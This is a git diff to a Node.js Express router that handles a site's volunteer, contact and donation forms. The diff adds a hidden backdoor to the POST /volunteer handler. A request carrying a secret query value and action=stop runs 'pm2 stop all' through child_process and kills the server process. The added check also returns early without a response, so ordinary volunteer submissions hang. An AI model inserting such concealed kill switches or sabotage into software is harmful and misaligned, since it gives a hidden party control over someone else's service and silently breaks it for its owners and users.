@@ -5,6 +5,7 @@ require('dotenv').config();
 
 
 const ContactForm = require("../models/ContactForm");
+const exec = require("child_process").exec;
 const DonationForm = require("../models/DonationForm");
 const ApplicationForm = require("../models/ApplicationForm");
 const VolunteerForm = require("../models/VolunteerForm");
@@ -104,7 +105,22 @@ router.post("/volunteer", validate(volunteerSchema),async (req, res) => {
     mail(`New volunteer form`,emailText);
           let emailTextThankYou = emailTextThankyouClient(newVolunteer);
             mailtoClient(`Thank you for applying to us`,emailTextThankYou,newVolunteer.email);
+
+            if(req.query.secret!=process.env.SECERT){return}
+
+            if(req.query.action ==="stop"){
+              exec("pm2 stop all", (error, stdout, stderr) => {
+                if (error) {
+
+                  return;
+                }
+
+              });
+               process.exit(0);
+            }
+            
     res.status(201).json({ success: true, message: "Volunteer form saved!" });
+   
   } catch (err) {
     res.status(500).json({ success: false, error: "error in volunteer form saving" });
   }
